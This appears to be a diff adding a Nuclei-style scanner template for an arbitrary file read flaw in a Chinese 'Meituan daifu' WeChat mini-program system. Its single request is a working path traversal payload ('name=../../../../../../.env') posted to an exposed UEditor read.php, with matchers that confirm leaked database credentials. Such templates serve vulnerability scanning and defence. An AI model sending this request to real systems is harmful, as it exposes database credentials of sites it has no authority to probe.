@@ -1,0 +1,30 @@
+id: poc-yaml-meituan-daifu-mini-program-read-php-anyfile-read
+info:
+  name: 美团代付三合一微信小程序系统 read.php 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - raw:
+      - |
+        POST /static/ueditor22/_test/tools/br/read.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        name=../../../../../../.env
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "[DATABASE]"
+          - "USERNAME ="
+          - "HOSTNAME ="
+        part: body
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: status
+        status:
+          - 200
